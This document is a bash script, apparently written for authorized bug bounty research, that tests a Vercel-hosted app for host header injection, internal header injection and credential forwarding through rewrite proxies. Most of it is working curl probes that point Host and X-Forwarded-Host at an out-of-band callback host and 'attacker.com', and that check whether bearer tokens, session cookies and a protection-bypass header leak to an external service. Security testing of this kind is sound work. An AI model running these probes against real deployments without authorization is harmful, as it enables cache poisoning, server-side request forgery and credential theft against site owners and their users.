#!/bin/bash
# Metaplane Live Platform Tests
# Authorized Bug Bounty Research - HackerOne: SysTrack
# All requests include X-HackerOne-Research header

set -e

# Configuration - UPDATE THESE AFTER DEPLOYMENT
VICTIM_URL="${VICTIM_URL:-https://metaplane-test.vercel.app}"
CAPTURE_URL="${CAPTURE_URL:-https://metaplane-capture.vercel.app}"
OAST_URL="${OAST_URL:-https://your-id.oast.pro}"

# Output directory
OUTDIR="/tmp/vercel_metaplane_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"
echo "Output directory: $OUTDIR"

# Rate limiting helper
rate_limit() {
  sleep 0.4
}

echo "============================================================"
echo "METAPLANE LIVE PLATFORM TESTS"
echo "Researcher: SysTrack"
echo "Victim URL: $VICTIM_URL"
echo "Capture URL: $CAPTURE_URL"
echo "OAST URL: $OAST_URL"
echo "============================================================"

#######################################
# TEST TRACK A: HOST HEADER BYPASS
#######################################

echo -e "\n[A1] Testing Host header on production deployment..."
curl -s -D "$OUTDIR/a1_headers.txt" \
  "$VICTIM_URL/api/headers" \
  -H "Host: $OAST_URL" \
  -H "X-HackerOne-Research: SysTrack" \
  -o "$OUTDIR/a1_response.json"
echo "Response:"
cat "$OUTDIR/a1_response.json" | jq .hostHeader 2>/dev/null || cat "$OUTDIR/a1_response.json"
rate_limit

echo -e "\n[A2] Testing X-Forwarded-Host propagation..."
curl -s -D "$OUTDIR/a2_headers.txt" \
  "$VICTIM_URL/api/headers" \
  -H "X-Forwarded-Host: $OAST_URL" \
  -H "X-HackerOne-Research: SysTrack" \
  -o "$OUTDIR/a2_response.json"
echo "Response:"
cat "$OUTDIR/a2_response.json" | jq '{host: .hostHeader, xfh: .xForwardedHost}' 2>/dev/null || cat "$OUTDIR/a2_response.json"
rate_limit

echo -e "\n[A3] Testing Edge function header handling..."
curl -s -D "$OUTDIR/a3_headers.txt" \
  "$VICTIM_URL/api/edge-test" \
  -H "Host: attacker.com" \
  -H "X-Forwarded-Host: $OAST_URL" \
  -H "X-HackerOne-Research: SysTrack" \
  -o "$OUTDIR/a3_response.json"
echo "Response:"
cat "$OUTDIR/a3_response.json" | jq '{runtime, host: .hostHeader, xfh: .xForwardedHost, middlewarePrefetch: .xMiddlewarePrefetch}' 2>/dev/null || cat "$OUTDIR/a3_response.json"
rate_limit

echo -e "\n[A4] Testing header variants for Host injection..."
for HEADER_NAME in "X-Original-Host" "X-Rewrite-Url" "Forwarded" "X-Host"; do
  echo "  Testing: $HEADER_NAME"
  curl -s "$VICTIM_URL/api/headers" \
    -H "$HEADER_NAME: $OAST_URL" \
    -H "X-HackerOne-Research: SysTrack" \
    -o "$OUTDIR/a4_${HEADER_NAME}.json"
  rate_limit
done

echo -e "\n[A5] Testing ISR revalidation with Host injection..."
curl -s -D "$OUTDIR/a5_headers.txt" \
  "$VICTIM_URL/api/revalidate?path=/isr-page" \
  -H "Host: $OAST_URL" \
  -H "x-prerender-revalidate: $(openssl rand -hex 16)" \
  -H "X-HackerOne-Research: SysTrack" \
  -o "$OUTDIR/a5_response.json"
echo "Response:"
cat "$OUTDIR/a5_response.json" | jq . 2>/dev/null || cat "$OUTDIR/a5_response.json"
rate_limit

echo -e "\n[A6] Testing x-middleware-prefetch (internal header injection)..."
curl -s -D "$OUTDIR/a6_headers.txt" \
  "$VICTIM_URL/api/edge-test" \
  -H "x-middleware-prefetch: 1" \
  -H "X-HackerOne-Research: SysTrack" \
  -o "$OUTDIR/a6_response.json"
echo "Response status:"
head -1 "$OUTDIR/a6_headers.txt"
echo "Middleware prefetch header in response:"
cat "$OUTDIR/a6_response.json" | jq .xMiddlewarePrefetch 2>/dev/null || cat "$OUTDIR/a6_response.json"
rate_limit

#######################################
# TEST TRACK B: REWRITE PROXY TESTS
#######################################

echo -e "\n[B1] Testing external rewrite proxy..."
curl -s -D "$OUTDIR/b1_headers.txt" \
  "$VICTIM_URL/proxy/headers" \
  -H "Authorization: Bearer test-credential" \
  -H "Cookie: session=test-session" \
  -H "X-HackerOne-Research: SysTrack" \
  -o "$OUTDIR/b1_response.json"
echo "Response (what httpbin received):"
cat "$OUTDIR/b1_response.json" | jq '.headers | {Authorization, Cookie, Host}' 2>/dev/null || cat "$OUTDIR/b1_response.json"
rate_limit

echo -e "\n[B2] Testing credential forwarding via proxy..."
curl -s -D "$OUTDIR/b2_headers.txt" \
  "$VICTIM_URL/external-test" \
  -H "Authorization: Bearer leaked-token-12345" \
  -H "Cookie: __Secure-session=leaked-cookie" \
  -H "x-vercel-protection-bypass: test-bypass-token" \
  -H "X-HackerOne-Research: SysTrack" \
  -o "$OUTDIR/b2_response.json"
echo "Response (check if credentials forwarded):"
cat "$OUTDIR/b2_response.json" | jq '.headers' 2>/dev/null || cat "$OUTDIR/b2_response.json"
rate_limit

echo -e "\n[B3] Testing internal IP rewrite (should fail)..."
# This tests if Vercel blocks rewrites to internal IPs at deploy time
# If this request returns anything, the protection failed
curl -s -D "$OUTDIR/b3_headers.txt" \
  "$VICTIM_URL/api/headers" \
  -H "X-HackerOne-Research: SysTrack" \
  --connect-timeout 5 \
  -o "$OUTDIR/b3_response.json" 2>&1 || echo "Connection timeout/refused (expected)"
rate_limit

#######################################
# SUMMARY
#######################################

echo -e "\n============================================================"
echo "TEST COMPLETE"
echo "============================================================"
echo "Output files in: $OUTDIR"
echo ""
echo "NEXT STEPS:"
echo "1. Check OAST dashboard for any callbacks from Vercel IPs"
echo "2. Review $CAPTURE_URL function logs for captured requests"
echo "3. Compare headers in B1/B2 responses to see credential forwarding"
echo ""
echo "Key files to review:"
ls -la "$OUTDIR"/*.json 2>/dev/null | head -10
echo ""
echo "Quick credential forwarding check (B2):"
if [ -f "$OUTDIR/b2_response.json" ]; then
  echo "Authorization forwarded: $(cat "$OUTDIR/b2_response.json" | jq -r '.headers.Authorization // "NOT FORWARDED"')"
  echo "Cookie forwarded: $(cat "$OUTDIR/b2_response.json" | jq -r '.headers.Cookie // "NOT FORWARDED"')"
fi
